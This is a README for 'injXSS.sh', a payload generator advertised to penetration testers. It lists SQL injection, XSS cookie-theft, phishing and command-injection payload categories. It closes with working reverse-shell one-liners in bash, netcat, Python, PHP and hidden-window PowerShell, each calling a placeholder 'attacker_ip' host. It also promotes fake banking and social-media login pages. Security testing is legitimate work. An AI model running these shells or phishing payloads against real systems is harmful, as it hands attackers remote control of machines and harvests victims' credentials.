# injXSS.sh

injXSS.sh is a powerful and comprehensive payload generator designed for penetration testers and security researchers. This script provides a categorized and detailed collection of payloads for web security testing, covering SQL Injection, XSS, JavaScript Injection, HTML Injection, Phishing, Command/System Injection, and Reverse Shell attacks. It’s an indispensable tool for identifying and exploiting vulnerabilities in web applications and server configurations.

Features

1. SQL Injection Payloads

Efficiently test database vulnerabilities using a variety of payloads, including:

Classic SQL Injection: Exploit OR conditions for authentication bypass or data retrieval.

Union-Based Injection: Retrieve data using UNION SELECT techniques.

Error-Based Injection: Extract information through database error messages.

Blind SQL Injection: Test without visible feedback using Boolean or Time-based methods.

Advanced Payloads: Dump database schemas, extract sensitive data, execute system commands, and create backdoors.


2. Cross-Site Scripting (XSS) Payloads

Exploit client-side vulnerabilities with payloads such as:

Reflected XSS: Inject malicious scripts through query parameters or user input.

Stored XSS: Exploit persistent injection points to deliver malicious scripts to other users.

DOM-Based XSS: Manipulate the DOM to execute scripts dynamically.

Advanced XSS Techniques: Bypass Content Security Policies (CSP), attack modern JavaScript frameworks (e.g., AngularJS, ReactJS), and steal cookies.


3. JavaScript Injection Payloads

Generate payloads for browser-based attacks, including:

Manipulate DOM Elements: Exploit document.write and eval.

Session and Local Storage Attacks: Extract sensitive session or local data.

Cross-Origin Requests: Send malicious XMLHttpRequests or hijack WebSocket connections.

Dynamic Payloads: Trigger JavaScript code through event listeners or hidden elements.


4. HTML Injection Payloads

Simulate malicious input to test HTML vulnerabilities:

Create fake forms, inject malicious tags like <iframe>, <embed>, and <script>.

Exploit SVG, CSS, and image attributes to execute hidden attacks.

Simulate phishing through HTML manipulation of visible elements.


5. Phishing Payloads

Design realistic phishing scenarios to assess user awareness:

Fake login forms for social media, email, banking, or cloud platforms.

Pages mimicking payment gateways and account recovery.

Embed malicious file upload forms to compromise user data.


6. Command & System Injection Payloads

Test server-side vulnerabilities, including:

Execute system commands on Linux and Windows.

Deploy reverse shells for persistent access.

Manipulate and retrieve sensitive server files, such as /etc/passwd or database configurations.


7. Reverse Shell Payloads (Full List)

Comprehensive reverse shell payloads for gaining remote access to compromised systems:

Reverse shells for Linux, Windows, and macOS.

Payloads using popular tools such as bash, netcat, Python, Perl, PHP, and PowerShell.

Variants for different network environments, including dynamic ports and encrypted communication.


Here’s a preview of some reverse shell payloads:

# Bash Reverse Shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1  

# Netcat Reverse Shell
nc -e /bin/bash attacker_ip 4444  

# Python Reverse Shell
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'  

# PHP Reverse Shell
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/bash -i <&3 >&3 2>&3");'  

# PowerShell Reverse Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()
